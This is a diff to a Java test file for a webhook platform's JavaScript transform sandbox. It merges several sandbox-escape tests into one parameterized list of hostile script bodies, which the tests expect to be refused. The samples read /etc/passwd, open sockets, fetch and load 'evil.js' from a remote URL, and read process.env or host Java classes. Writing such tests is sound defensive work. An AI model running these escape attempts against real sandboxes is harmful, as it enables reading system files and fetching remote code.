@@ -6,6 +6,10 @@ import org.junit.jupiter.api.BeforeAll;
 import org.junit.jupiter.api.DisplayName;
 import org.junit.jupiter.api.Nested;
 import org.junit.jupiter.api.Test;
+import com.webhook.platform.common.exception.ScriptTransformException;
+import org.junit.jupiter.params.ParameterizedTest;
+import org.junit.jupiter.params.provider.Arguments;
+import org.junit.jupiter.params.provider.MethodSource;
 
 import java.time.Duration;
 import java.time.Instant;
@@ -16,6 +20,7 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.Future;
 import java.util.concurrent.TimeUnit;
 import java.util.stream.IntStream;
+import java.util.stream.Stream;
 
 import static org.assertj.core.api.Assertions.assertThat;
 import static org.assertj.core.api.Assertions.assertThatThrownBy;
@@ -186,7 +191,6 @@ class JavaScriptTransformEngineTest {
     }
 
     @Nested
-    @DisplayName("console")
     class Console {
 
         @Test
@@ -278,47 +282,31 @@ class JavaScriptTransformEngineTest {
             assertThat(e.getMessage()).containsIgnoringCase("java");
         }
 
-        @Test
-        void theJavaPackageGlobals() {
+        static Stream<Arguments> escapes() {
+            ScriptTransformException.Reason runtime = ScriptTransformException.Reason.RUNTIME;
+            return Stream.of(
+                    Arguments.of("return { payload: { f: new java.io.File('/etc/passwd').length() } };", runtime),
+                    Arguments.of("return { payload: new java.net.Socket('example.com', 80) };", runtime),
+                    Arguments.of("return { payload: fetch('https://example.com') };", runtime),
+                    Arguments.of("return { payload: new XMLHttpRequest() };", runtime),
+                    Arguments.of("return { payload: require('fs').readFileSync('/etc/passwd') };", runtime),
+                    Arguments.of("return { payload: load('https://example.com/evil.js') };", runtime),
+                    Arguments.of("return { payload: readFully('/etc/passwd') };", runtime),
+                    Arguments.of("new Worker('x'); return { payload: {} };", runtime),
+                    Arguments.of("return { payload: process.env };", null),
+                    Arguments.of("return { payload: Polyglot.eval('js','1') };", null),
+                    Arguments.of("return { payload: Packages.java.lang.System };", null));
+        }
+
+        @ParameterizedTest
+        @MethodSource("escapes")
+        void reachingOutOfTheSandbox(String body, ScriptTransformException.Reason reason) {
             ScriptTransformException e = catchThrowableOfType(
-                    () -> run("function handler(w) { return { payload: { f: new java.io.File('/etc/passwd').length() } }; }", "{}"),
-                    ScriptTransformException.class);
-            assertThat(e.reason()).isEqualTo(ScriptTransformException.Reason.RUNTIME);
-        }
+                    () -> run("function handler(w) { " + body + " }", "{}"), ScriptTransformException.class);
 
-        @Test
-        void openingASocketOrReadingAFile() {
-            for (String attempt : List.of(
-                    "new java.net.Socket('example.com', 80)",
-                    "fetch('https://example.com')",
-                    "new XMLHttpRequest()",
-                    "require('fs').readFileSync('/etc/passwd')",
-                    "load('https://example.com/evil.js')",
-                    "readFully('/etc/passwd')")) {
-                ScriptTransformException e = catchThrowableOfType(
-                        () -> run("function handler(w) { return { payload: " + attempt + " }; }", "{}"),
-                        ScriptTransformException.class);
-                assertThat(e)
-                        .describedAs("attempt %s must be refused", attempt)
-                        .isNotNull();
-                assertThat(e.reason()).isEqualTo(ScriptTransformException.Reason.RUNTIME);
-            }
-        }
-
-        @Test
-        void startingAThread() {
-            ScriptTransformException e = catchThrowableOfType(
-                    () -> run("function handler(w) { new Worker('x'); return { payload: {} }; }", "{}"),
-                    ScriptTransformException.class);
-            assertThat(e.reason()).isEqualTo(ScriptTransformException.Reason.RUNTIME);
-        }
-
-        @Test
-        void readingTheHostEnvironment() {
-            for (String attempt : List.of("process.env", "Polyglot.eval('js','1')", "Packages.java.lang.System")) {
-                assertThatThrownBy(() -> run("function handler(w) { return { payload: " + attempt + " }; }", "{}"))
-                        .describedAs("attempt %s must be refused", attempt)
-                        .isInstanceOf(ScriptTransformException.class);
+            assertThat(e).describedAs("%s must be refused", body).isNotNull();
+            if (reason != null) {
+                assertThat(e.reason()).isEqualTo(reason);
             }
         }
 
